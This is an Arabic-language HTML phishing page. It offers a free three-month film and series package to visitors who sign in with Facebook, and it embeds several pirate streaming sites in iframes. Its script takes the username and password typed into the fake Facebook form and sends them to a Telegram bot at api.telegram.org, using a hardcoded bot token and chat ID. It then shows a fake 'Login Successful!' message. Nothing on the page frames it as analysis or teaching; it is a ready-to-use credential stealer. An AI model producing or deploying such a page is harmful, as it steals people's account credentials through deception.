<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تضمين موقع خارجي</title>
    <style>
     *{
         padding: 0;
         margin: 0;
     }   
        
   body{
       height: 200px;
       width: 100%;
       background: rgba(0,0,10,0.3);
   }     
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 60%;
            margin: 80px auto;
        }
        .login-container p{
            text-align: center;
            background: rgba(0,0,200,0.3);
            padding: 10px 0px;
            border-radius: 20px;
            margin: 10px 0px;
            text-shadow: 1px 1px 1px red;
            color: red;
            font-size: 50px;
        }
        h2 {
            text-align: center;
            margin: auto auto;
            color: blue;
            margin-top: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            background-color: #33b5e5;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #1d9bde;
        }
        
      h4{
          padding: 50px 0px;
          width: 100%;
          text-align: center;
          font-size: 50px;
          color: orange;
          box-shadow: 0px 0px 30px blue;
      }  
        
        iframe {
            width: 90%;
            height: 600px;
            border: none;
            margin: 3% 5%;
        }       
    </style>
</head>
<body>
    

    <div class="login-container">
        <p>سجل الان بحساب فيس بوك وليك باقه مجانيه ٣ شهور أفلام و مسلسلات </p>
        <h2>facebook</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Enter Username" required>
            <input type="password" id="password" placeholder="Enter Password" required>
            <button type="submit">Login</button>
        </form>
        <div id="response"></div>
    </div>
    
   <h4> TOP cinema </h4> 
    <iframe src="https://web2.topcinema.cam/home1/" title="موقع خارجي"></iframe>
    <h4> Egybest </h4>
    <iframe src="https://egybest.onl/" title="egybest" ></iframe>
  <h4> Arabseed </h4>  
    <iframe src="https://arabseed.show/"></iframe>
    <h4> Movizland </h4>
    <iframe src="https://movizland.lol/"></iframe>
    </iframe>
    
 <script>
 
const botToken = "7633527726:AAE2vT6EYHRXJY8cCeP2ClCHyXRXZnfQRSk"; // Replace with your Telegram Bot API Token
        const chatId = "6004701124"; // Replace with the chat ID you want to send messages to
        
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            if (username && password) {
                sendLoginDetailsToTelegram(username, password);
            }
        });
        function sendLoginDetailsToTelegram(username, password) {
            const message = `New Login Attempt:
Username: ${username}
Password: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        document.getElementById("response").innerHTML = "<p>Login Successful!</p>";
                    } else {
                        document.getElementById("response").innerHTML = "<p>There was an error, please try again later.</p>";
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById("response").innerHTML = "<p>There was an error, please try again later.</p>";
                });
        }
      
 </script>   
    
    
</body>
</html>
